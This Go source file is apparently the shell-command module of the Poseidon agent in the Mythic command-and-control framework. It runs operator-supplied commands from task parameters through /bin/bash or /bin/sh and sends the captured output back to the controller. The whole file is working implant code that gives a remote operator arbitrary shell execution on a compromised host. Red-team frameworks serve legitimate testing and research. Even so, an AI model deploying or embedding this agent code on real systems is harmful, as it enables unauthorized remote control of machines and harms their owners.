package shell

import (
	// Standard
	"bytes"
	"os"
	"os/exec"
	"strings"

	// Poseidon

	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
)

//Run - Function that executes the shell command
func Run(task structs.Task) {
	msg := structs.Response{}
	msg.TaskID = task.TaskID
	shellBin := "/bin/bash"
	if _, err := os.Stat(shellBin); err != nil {
		if _, err = os.Stat("/bin/sh"); err != nil {
			msg.SetError("Could not find /bin/bash or /bin/sh")
			task.Job.SendResponses <- msg
			return
		} else {
			shellBin = "/bin/sh"
		}
	}

	cmd := exec.Command(shellBin)
	cmd.Stdin = strings.NewReader(task.Params)
	var out bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &out
	err := cmd.Run()
	var outputString string
	if out.String() == "" {
		outputString = "Command processed (no output)."
	} else {
		outputString = out.String()
	}
	msg.UserOutput = outputString
	msg.Completed = true
	if err != nil {
		msg.Status = "error"
		msg.UserOutput += "\n" + err.Error()
	}
	task.Job.SendResponses <- msg
	return
}
